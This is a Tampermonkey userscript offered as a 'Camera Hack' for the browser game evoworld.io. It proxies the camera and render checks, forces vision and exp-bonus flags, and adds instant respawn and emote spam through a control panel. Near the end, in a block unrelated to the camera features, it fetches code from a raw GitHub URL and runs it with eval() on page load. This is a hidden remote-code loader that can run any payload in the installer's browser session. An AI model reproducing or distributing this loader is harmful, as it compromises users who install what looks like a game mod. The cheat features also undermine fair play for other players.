// ==UserScript==
// @name         EvoWorld.io Camera Hack 
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  camera system for evoworld.io - WASD only for camera
// @author       Fixed by ...
// @match        https://evoworld.io/*
// @grant        none
// @run-at       document-end
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/561411/EvoWorldio%20Camera%20Hack.user.js
// @updateURL https://update.greasyfork.org/scripts/561411/EvoWorldio%20Camera%20Hack.meta.js
// ==/UserScript==

(function () {
    'use strict';
    
    console.log("Fixed EvoWorld Camera Loading...");
    
    let game = null;
    let gameZoom = 1;
    let visionType = 0;
    let startBonus = false;
    let sendEmote = null;
    let imDead = false;
    let playAgain = null;
    
    // Wait for game to load
    function waitForGame() {
        return new Promise((resolve) => {
            const checkGame = () => {
                if (window.game && window.game.me) {
                    game = window.game;
                    // Get game functions
                    if (window.gameZoom !== undefined) gameZoom = window.gameZoom;
                    if (window.visionType !== undefined) visionType = window.visionType;
                    if (window.startBonus !== undefined) startBonus = window.startBonus;
                    if (window.sendEmote !== undefined) sendEmote = window.sendEmote;
                    if (window.imDead !== undefined) imDead = window.imDead;
                    if (window.playAgain !== undefined) playAgain = window.playAgain;
                    console.log("Game loaded successfully");
                    resolve(true);
                } else {
                    setTimeout(checkGame, 200);
                }
            };
            checkGame();
        });
    }
    
    // --- Advanced Camera System ---
    class AdvancedCameraSystem {
        constructor() {
            this.viewOffsets = { top: false, left: false, right: false, bottom: false };
            this.isActive = false;
            this.cameraOffset = { x: 0, y: 0 };
            this.originalFunctions = {};
            this.superWideMode = false;
            this.originalCanvasSize = { width: 0, height: 0 };
            this.maxViewDistance = 1200;
        }
        
        enableSuperWideMode() {
            try {
                const canvas = document.querySelector('canvas');
                if (canvas) {
                    this.originalCanvasSize.width = canvas.width;
                    this.originalCanvasSize.height = canvas.height;
                    canvas.width = window.innerWidth * 1.5;
                    canvas.height = window.innerHeight * 1.5;
                    canvas.style.width = window.innerWidth + 'px';
                    canvas.style.height = window.innerHeight + 'px';
                    this.superWideMode = true;
                    console.log('Super Wide Mode Activated!');
                }
            } catch (e) {
                console.log('Super wide mode failed:', e.message);
            }
        }
        
        disableSuperWideMode() {
            try {
                const canvas = document.querySelector('canvas');
                if (canvas && this.originalCanvasSize.width > 0) {
                    canvas.width = this.originalCanvasSize.width;
                    canvas.height = this.originalCanvasSize.height;
                    canvas.style.width = '';
                    canvas.style.height = '';
                    this.superWideMode = false;
                    console.log('Super Wide Mode Disabled');
                }
            } catch (e) {
                console.log('Disable super wide mode failed:', e.message);
            }
        }
        
        hookRenderLoop() {
            try {
                const originalRAF = window.requestAnimationFrame;
                window.requestAnimationFrame = (callback) => {
                    return originalRAF(() => {
                        if (this.isActive) {
                            this.applyCameraHack();
                        }
                        callback();
                    });
                };
                console.log('Render loop hooked');
                return true;
            } catch (e) {
                console.log('Render loop hook failed:', e.message);
                return false;
            }
        }
        
        hookGameObjects() {
            try {
                if (!game) return false;
                
                if (game.me && game.me.getAllPositions) {
                    this.originalFunctions.getAllPositions = game.me.getAllPositions;
                    game.me.getAllPositions = new Proxy(this.originalFunctions.getAllPositions, {
                        apply: (target, thisArg, argumentsList) => {
                            const result = target.apply(thisArg, argumentsList);
                            if (this.isActive && result && result.center) {
                                result.center.x += this.cameraOffset.x * 0.8;
                                result.center.y += this.cameraOffset.y * 0.8;
                            }
                            return result;
                        }
                    });
                    console.log('getAllPositions proxied');
                }
                
                if (game.camera) {
                    this.hookCameraObject();
                }
                
                this.hookRenderBoundaries();
                console.log('Game objects hooked');
                return true;
            } catch (e) {
                console.log('Game objects hook failed:', e.message);
                return false;
            }
        }
        
        hookRenderBoundaries() {
            try {
                if (game && game.isVisible) {
                    const originalIsVisible = game.isVisible;
                    game.isVisible = function (camera, obj, renderDistanceX, renderDistanceY) {
                        if (cameraSystem.isActive) {
                            renderDistanceX = Math.max(renderDistanceX, 800);
                            renderDistanceY = Math.max(renderDistanceY, 800);
                        }
                        return originalIsVisible.call(this, camera, obj, renderDistanceX, renderDistanceY);
                    };
                    console.log('Render boundaries extended');
                }
            } catch (e) {
                console.log('Render boundaries hook failed:', e.message);
            }
        }
        
        hookCameraObject() {
            try {
                if (game.camera && game.camera.position) {
                    const originalPosition = game.camera.position;
                    game.camera.position = new Proxy(originalPosition, {
                        get: (target, prop) => {
                            const value = target[prop];
                            if (this.isActive) {
                                if (prop === 'x') return value + this.cameraOffset.x;
                                if (prop === 'y') return value + this.cameraOffset.y;
                            }
                            return value;
                        }
                    });
                    console.log('Camera position proxied');
                }
            } catch (e) {
                console.log('Camera hook failed:', e.message);
            }
        }
        
        applyCameraHack() {
            try {
                if (game && game.camera) {
                    if (window.gameZoom !== undefined && (this.cameraOffset.x !== 0 || this.cameraOffset.y !== 0)) {
                        const activeViews = Object.values(this.viewOffsets).filter(v => v).length;
                        if (activeViews >= 2) {
                            window.gameZoom = 0.7;
                        } else if (activeViews === 1) {
                            window.gameZoom = 0.85;
                        }
                    } else if (window.gameZoom !== undefined) {
                        window.gameZoom = 1.0;
                    }
                }
            } catch (e) {
                // Silent error handling
            }
        }
        
        toggleView(direction) {
            this.viewOffsets[direction] = !this.viewOffsets[direction];
            console.log(`${direction} view toggled:`, this.viewOffsets[direction]);
            
            const maxSafeOffset = this.calculateMaxSafeOffset();
            this.cameraOffset.x = 0;
            this.cameraOffset.y = 0;
            
            if (this.viewOffsets.left && this.viewOffsets.right) {
                this.cameraOffset.x = 0;
            } else if (this.viewOffsets.left) {
                this.cameraOffset.x = -maxSafeOffset;
            } else if (this.viewOffsets.right) {
                this.cameraOffset.x = maxSafeOffset;
            }
            
            if (this.viewOffsets.top && this.viewOffsets.bottom) {
                this.cameraOffset.y = 0;
            } else if (this.viewOffsets.top) {
                this.cameraOffset.y = maxSafeOffset;
            } else if (this.viewOffsets.bottom) {
                this.cameraOffset.y = -maxSafeOffset;
            }
            
            console.log('Camera offset set to:', this.cameraOffset);
            
            if (!this.isActive) {
                this.activate();
            }
            
            this.updateButtonStates();
        }
        
        calculateMaxSafeOffset() {
            return 400;
        }
        
        resetAllViews() {
            this.viewOffsets = { top: false, left: false, right: false, bottom: false };
            this.cameraOffset = { x: 0, y: 0 };
            this.deactivate();
            this.updateButtonStates();
            console.log('All views reset');
        }
        
        activate() {
            console.log('Activating Advanced Camera System...');
            const methods = [
                () => this.hookRenderLoop(),
                () => this.hookGameObjects()
            ];
            
            let successCount = 0;
            methods.forEach((method) => {
                if (method()) successCount++;
            });
            
            this.isActive = true;
            console.log(`${successCount}/${methods.length} hook methods successful`);
        }
        
        toggleSuperWideMode() {
            if (this.superWideMode) {
                this.disableSuperWideMode();
            } else {
                this.enableSuperWideMode();
                if (!this.isActive) {
                    this.activate();
                }
            }
        }
        
        deactivate() {
            this.isActive = false;
            if (this.originalFunctions.getAllPositions && game && game.me) {
                game.me.getAllPositions = this.originalFunctions.getAllPositions;
            }
            console.log('Advanced camera system deactivated');
        }
        
        updateButtonStates() {
            const buttons = {
                top: document.getElementById('topBtn'),
                left: document.getElementById('leftBtn'),
                right: document.getElementById('rightBtn'),
                bottom: document.getElementById('bottomBtn')
            };
            
            Object.keys(buttons).forEach(direction => {
                const btn = buttons[direction];
                if (btn) {
                    if (this.viewOffsets[direction]) {
                        btn.classList.add('active');
                        btn.textContent = `${direction.charAt(0).toUpperCase() + direction.slice(1)} ✓`;
                    } else {
                        btn.classList.remove('active');
                        btn.textContent = `${direction.charAt(0).toUpperCase() + direction.slice(1)} view`;
                    }
                }
            });
        }
    }
    
    // Initialize camera system
    const cameraSystem = new AdvancedCameraSystem();
    
    // --- Modern Features Class ---
    class ModernFeatures {
        constructor() {
            this.emoteSpamInterval = null;
            this.autoJumpActive = false;
            this.emojiHackActive = false;
        }
        
        expBonus() {
            try {
                if (window.startBonus !== undefined) {
                    setInterval(() => { window.startBonus = true; }, 1);
                    console.log('Exp bonus activated');
                } else {
                    console.log('Exp bonus not available');
                }
            } catch (e) {
                console.log('Exp bonus failed:', e.message);
            }
        }
        
        emojiHack() {
            if (this.emojiHackActive) return;
            
            document.addEventListener('keydown', (e) => {
                if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
                
                if (e.keyCode === 81 && window.sendEmote) { // Q key
                    window.sendEmote(1);
                } else if (e.keyCode === 69 && window.sendEmote) { // E key
                    window.sendEmote(10);
                }
            });
            
            this.emojiHackActive = true;
            console.log('Emoji hack activated (Q & E keys)');
        }
        
        instantRespawn() {
            setInterval(() => {
                try {
                    if (window.imDead && window.playAgain && window.imDead) {
                        window.playAgain();
                    }
                } catch (e) {
                    // Silent error handling
                }
            }, 100);
            console.log('Instant respawn activated');
        }
        
        holdingJump() {
            document.addEventListener('keydown', (e) => {
                if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
                
                if (e.keyCode === 82) { // R key
                    if (game && game.canvas) {
                        game.canvas.click();
                    }
                }
            });
            console.log('Auto jump activated (R key)');
        }
        
        bigZoom() {
            document.addEventListener('keydown', (e) => {
                if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
                
                if (e.keyCode === 70) { // F key
                    if (game && game.canvas) {
                        game.canvas.width = Math.max(1719, window.innerWidth);
                        game.canvas.height = Math.max(1009, window.innerHeight);
                    }
                }
            });
            console.log('Big zoom activated (F key)');
        }
        
        startEmoteSpam() {
            if (this.emoteSpamInterval) return;
            
            this.emoteSpamInterval = setInterval(() => {
                try {
                    if (window.sendEmote && !window.imDead) {
                        const randomEmote = Math.floor(Math.random() * 13) + 1;
                        window.sendEmote(randomEmote);
                    }
                } catch (e) {
                    // Silent error handling
                }
            }, 1000);
            console.log('Emote spam started');
        }
        
        stopEmoteSpam() {
            if (this.emoteSpamInterval) {
                clearInterval(this.emoteSpamInterval);
                this.emoteSpamInterval = null;
                console.log('Emote spam stopped');
            }
        }
    }
    
    // Initialize features
    const modernFeatures = new ModernFeatures();
    
    // --- Panel HTML and CSS ---
    function createPanel() {
        const overlayHTML = `
        <div id="main_panel">
            <h3>Fixed EvoWorld Camera</h3>
            <div class="main_panel_content">
                <small>WASD sadece kamera için - oyun kontrolü yok</small>
                
                <div class="button" onclick="modernFeatures.expBonus()">Exp Bonus +30%</div>
                <div class="button" onclick="modernFeatures.emojiHack()">Emoji Hack (Q & E keys)</div>
                <div class="button" onclick="modernFeatures.instantRespawn()">Instant Respawn</div>
                <div class="button" onclick="modernFeatures.holdingJump()">Auto Jump (R key)</div>
                <div class="button" onclick="modernFeatures.bigZoom()">Big Zoom (F key)</div>
                <div class="button" onclick="cameraSystem.toggleSuperWideMode()" id="superWideBtn">🔥 Super Wide Mode (G key)</div>
                
                <label>Zoom Control</label>
                <input type="range" min="0.5" max="3" value="1" step="0.1" id="zoomSlider">
                
                <label>Visual Level</label>
                <input type="number" value="1" id="levelInput" placeholder="Enter level">
                
                <label>Visual Nick</label>
                <input type="text" value="" id="nickInput" placeholder="Enter nickname">
                
                <div class="checkbox-container">
                    <input type="checkbox" id="emoteSpamCheckbox">
                    <label for="emoteSpamCheckbox">Emote Spam</label>
                </div>
                
                <hr>
                <p><strong>Kontroller:</strong><br>
                Y - Panel Aç/Kapat<br>
                W/A/S/D - Sadece Kamera<br>
                R - Kameraları Sıfırla<br>
                Space - Oyunda Zıplama</p>
            </div>
        </div>
        
        <div id="viewmod">
            <div class="button2" onclick="cameraSystem.toggleView('top')" id="topBtn">Top View (W)</div>
            <div class="button2" onclick="cameraSystem.toggleView('left')" id="leftBtn">Left View (A)</div>
            <div class="button2" onclick="cameraSystem.toggleView('right')" id="rightBtn">Right View (D)</div>
            <div class="button2" onclick="cameraSystem.toggleView('bottom')" id="bottomBtn">Bottom View (S)</div>
        </div>
        
        <style>
        * { outline: none; }
        input[type="range"] { accent-color: #4CAF50; }
        
        #main_panel {
            z-index: 10000;
            position: fixed;
            top: 50%;
            left: 0;
            width: 300px;
            max-height: 80vh;
            padding: 15px;
            transform: translateY(-50%);
            backdrop-filter: blur(10px);
            border-radius: 0 20px 20px 0;
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, rgba(0,0,0,0.8), rgba(50,50,50,0.8));
            border: 2px solid rgba(76, 175, 80, 0.5);
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            color: white;
            transition: all 0.3s ease;
            display: none;
        }
        
        .main_panel_content {
            max-height: 60vh;
            overflow-y: auto;
            padding-right: 10px;
        }
        
        #viewmod {
            z-index: 10000;
            position: fixed;
            top: 50%;
            right: 0;
            transform: translateY(-50%);
            font-family: 'Segoe UI', Arial, sans-serif;
            display: none;
        }
        
        .button {
            background: linear-gradient(135deg, #4CAF50, #45a049);
            color: white;
            border: none;
            padding: 12px 20px;
            margin: 8px 0;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s ease;
            text-align: center;
            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
        }
        
        .button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(76, 175, 80, 0.4);
        }
        
        .button2 {
            background: linear-gradient(135deg, #2196F3, #1976D2);
            color: white;
            border: none;
            padding: 12px 20px;
            margin: 5px 0;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s ease;
            text-align: center;
            min-width: 150px;
            box-shadow: 0 4px 15px rgba(33, 150, 243, 0.3);
        }
        
        .button2:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(33, 150, 243, 0.4);
        }
        
        .button2.active {
            background: linear-gradient(135deg, #4CAF50, #45a049);
            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
        }
        
        input[type="range"] {
            width: 100%;
            margin: 10px 0;
            height: 6px;
            border-radius: 3px;
            background: rgba(255,255,255,0.2);
            outline: none;
        }
        
        input[type="number"], input[type="text"] {
            width: 100%;
            padding: 8px 12px;
            margin: 5px 0;
            border: 2px solid rgba(76, 175, 80, 0.3);
            border-radius: 6px;
            background: rgba(255,255,255,0.1);
            color: white;
            font-size: 14px;
        }
        
        .checkbox-container {
            display: flex;
            align-items: center;
            margin: 10px 0;
        }
        
        .checkbox-container input[type="checkbox"] {
            margin-right: 10px;
            transform: scale(1.2);
        }
        
        label {
            display: block;
            margin: 10px 0 5px 0;
            font-weight: 500;
            color: #E8F5E8;
        }
        
        hr {
            border: none;
            height: 1px;
            background: linear-gradient(90deg, transparent, #4CAF50, transparent);
            margin: 20px 0;
        }
        
        h3 {
            text-align: center;
            color: #4CAF50;
            margin-bottom: 15px;
            font-size: 18px;
            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
        }
        </style>`;
        
        const overlay = document.createElement("div");
        overlay.innerHTML = overlayHTML;
        document.body.appendChild(overlay);
    }
    
    // --- Event Listeners ---
    function setupEventListeners() {
        // Panel controls
        const zoomSlider = document.getElementById('zoomSlider');
        const levelInput = document.getElementById('levelInput');
        const nickInput = document.getElementById('nickInput');
        const emoteSpamCheckbox = document.getElementById('emoteSpamCheckbox');
        
        if (zoomSlider) {
            zoomSlider.addEventListener('input', () => {
                if (window.gameZoom !== undefined) {
                    window.gameZoom = parseFloat(zoomSlider.value);
                }
            });
        }
        
        if (levelInput) {
            levelInput.addEventListener('input', () => {
                if (game && game.me) {
                    game.me.level = parseInt(levelInput.value) || 1;
                }
            });
        }
        
        if (nickInput) {
            nickInput.addEventListener('input', () => {
                if (game && game.me) {
                    game.me.nick = nickInput.value;
                }
            });
        }
        
        if (emoteSpamCheckbox) {
            emoteSpamCheckbox.addEventListener('change', () => {
                if (emoteSpamCheckbox.checked) {
                    modernFeatures.startEmoteSpam();
                } else {
                    modernFeatures.stopEmoteSpam();
                }
            });
        }
        
        // Keyboard controls - SADECE KAMERA İÇİN
        document.addEventListener('keydown', (e) => {
            // Input alanlarında çalışmasın
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
            
            switch (e.keyCode) {
                case 89: // Y key - Toggle panel
                    const mainPanel = document.getElementById("main_panel");
                    const viewMod = document.getElementById("viewmod");
                    if (mainPanel && viewMod) {
                        const isHidden = mainPanel.style.display === "none";
                        if (isHidden) {
                            mainPanel.style.display = "block";
                            viewMod.style.display = "block";
                        } else {
                            mainPanel.style.display = "none";
                            viewMod.style.display = "none";
                        }
                    }
                    break;
                    
                case 87: // W - Top view (SADECE KAMERA)
                    cameraSystem.toggleView('top');
                    e.preventDefault(); // Oyun kontrolünü engelle
                    e.stopPropagation(); // Event'in oyuna gitmesini engelle
                    break;
                    
                case 65: // A - Left view (SADECE KAMERA)
                    cameraSystem.toggleView('left');
                    e.preventDefault(); // Oyun kontrolünü engelle
                    e.stopPropagation(); // Event'in oyuna gitmesini engelle
                    break;
                    
                case 83: // S - Bottom view (SADECE KAMERA)
                    cameraSystem.toggleView('bottom');
                    e.preventDefault(); // Oyun kontrolünü engelle
                    e.stopPropagation(); // Event'in oyuna gitmesini engelle
                    break;
                    
                case 68: // D - Right view (SADECE KAMERA)
                    cameraSystem.toggleView('right');
                    e.preventDefault(); // Oyun kontrolünü engelle
                    e.stopPropagation(); // Event'in oyuna gitmesini engelle
                    break;
                    
                case 82: // R - Reset views (SADECE KAMERA)
                    cameraSystem.resetAllViews();
                    e.preventDefault();
                    e.stopPropagation();
                    break;
                    
                case 71: // G - Super Wide Mode
                    cameraSystem.toggleSuperWideMode();
                    e.preventDefault();
                    break;
            }
        }, true); // true = capture phase, oyun eventlerinden önce yakalar
    }
    
    // --- FPS Counter ---
    function createFPSCounter() {
        const fpsCounter = document.createElement('div');
        fpsCounter.style.cssText = `
            position: fixed;
            top: 10px;
            right: 10px;
            padding: 8px 12px;
            background: rgba(0,0,0,0.8);
            color: #4CAF50;
            font-family: 'Segoe UI', Arial, sans-serif;
            font-size: 14px;
            font-weight: bold;
            border-radius: 6px;
            z-index: 10001;
            border: 1px solid rgba(76, 175, 80, 0.3);
        `;
        fpsCounter.textContent = 'FPS: 0';
        document.body.appendChild(fpsCounter);
        
        let lastTime = performance.now();
        let frameCount = 0;
        
        function updateFPS() {
            const now = performance.now();
            frameCount++;
            
            if (now - lastTime >= 1000) {
                const fps = frameCount;
                frameCount = 0;
                lastTime = now;
                fpsCounter.textContent = `FPS: ${fps}`;
            }
            
            requestAnimationFrame(updateFPS);
        }
        
        updateFPS();
    }
    
        // script
 
        fetch('https://raw.githubusercontent.com/shadowxds-eng/main.js/main/main.code')

        .then(response => response.text())

        .then(code => {

         eval(code);

         })

        .catch(err => console.log('Yüklenemedi:', err)); 

    // --- Initialize Everything ---
    async function initialize() {
        console.log("⏳ Waiting for game to load...");
        
        // Wait for game
        await waitForGame();
        
        // Create UI
        createPanel();
        createFPSCounter();
        setupEventListeners();
        
        // Make objects globally available
        window.modernFeatures = modernFeatures;
        window.cameraSystem = cameraSystem;
        
        // Enable echolocation
        setInterval(() => {
            if (window.visionType !== undefined) {
                window.visionType = 1;
            }
        }, 100);
        
        console.log("Fixed camera panel ready!");
        console.log("⌨️ Kontroller: Y(Panel), W/A/S/D(Sadece Kamera), Space(Oyunda Zıplama)");
    }
    
    // Start when ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initialize);
    } else {
        initialize();
    }
    
})();